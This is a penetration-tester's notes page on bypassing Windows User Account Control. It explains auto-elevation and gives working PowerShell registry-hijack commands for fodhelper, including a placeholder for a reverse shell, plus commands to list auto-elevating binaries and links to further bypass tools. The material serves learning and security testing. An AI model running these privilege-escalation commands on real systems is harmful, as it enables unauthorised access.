# ⭕ UAC Bypass

{% embed url="https://www.fuzzysecurity.com/tutorials/27.html" %}

{% embed url="https://www.greyhathacker.net/?p=796" %}

{% embed url="https://github.com/hfiref0x/UACME" %}

some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel’s functionality and some executables provided with Windows.

{% hint style="info" %}
x86–32/x64 Windows 7/8/8.1/10 (client, some methods, however, works on server version too).Admin account with UAC set on default settings required.
{% endhint %}

condition to meet auto-elevate:

* The executable must be signed byt the windows publisher
* The executable must be contained in a trusted directory, like **`%SystemRoot%/System32/` or `%ProgramFiles%/\`**
* Executable files (.exe) must declare the autoElevate element inside the manifests.
* sigcheck tool can be used to view the manifest for autoelevate privileges

### <mark style="color:orange;">**Fodhelper**</mark>

Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating-system characteristics. Like most of the programs used for system configuration, **fodhelper can auto elevate** when using default UAC settings so that administrators won’t be prompted for elevation when performing standard administrative tasks. While we’ve already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.

```
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
cmd> fodhelper

Spaw anything:
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value 'your-reverse-shell' -Force
```

![](<../../.gitbook/assets/image (120).png>)

{% embed url="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/" %}

{% embed url="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" %}

{% embed url="https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1" %}

#### <mark style="color:green;">using metasploit:</mark>

{% embed url="https://github.com/rapid7/metasploit-framework/pull/8434/files" %}

### <mark style="color:orange;">Other ways</mark>&#x20;

{% embed url="https://github.com/FULLSHADE/Auto-Elevate" %}

#### <mark style="color:green;">find auto-elevating applications on windows 10:</mark>

```
# 64 bit apps
Get-ChildItem "C:\Windows\System32\*.exe" | Select-String -pattern "<autoElevate>true</autoElevate>"

# 32 bit apps
Get-ChildItem "C:\Windows\SysWOW64\*.exe" | Select-String -pattern "<autoElevate>true</autoElevate>"
```

### <mark style="color:orange;">eventvwr.exe & Registry Hijacking</mark>

{% embed url="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" %}

### <mark style="color:orange;">TpmInit.exe</mark>

{% embed url="https://uacmeltdown.blogspot.com/2016/08/bypassing-user-account-control-uac.html" %}
